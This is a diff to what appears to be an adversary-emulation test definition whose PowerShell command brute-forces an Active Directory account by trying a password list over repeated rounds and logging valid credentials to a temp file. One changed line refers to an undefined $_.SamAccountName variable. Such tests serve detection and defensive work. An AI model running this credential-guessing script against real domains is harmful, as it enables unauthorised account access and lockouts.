@@ -24,14 +24,25 @@ atomic_tests:
       description: Path to bruteforce output 
       type: Path
       default: C:\Windows\Temp\tmp.txt
+    number_of_attempts:
+      description: Number of password spraying attempts 
+      type: String
+      default: 2
   executor:
     name: powershell
     command: |
-      $passwords = "#{passwords}".split("`n")
-      foreach ($password in $passwords){
-        "[-] Attempting $password on account #{user}." | Out-File -FilePath #{output_file} -Append
-        if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
-          "[!] #{user}:$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+      $passwords = '#{passwords}'.split('`n')
+      $found = @()
+      for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
+        foreach ($password in $passwords){
+          "[-] Round ${i} of password guessing" | Out-File -FilePath #{output_file} -Append
+          " [-] Attempting ${password} on account #{user}." | Out-File -FilePath #{output_file} -Append
+          if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
+            if (-not ($found.Contains($password))){
+                " [!] $($_.SamAccountName):${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+                $found += ,$password
+              }
+          }
         }
       }
       "End of bruteforce" | Out-File -FilePath #{output_file} -Append
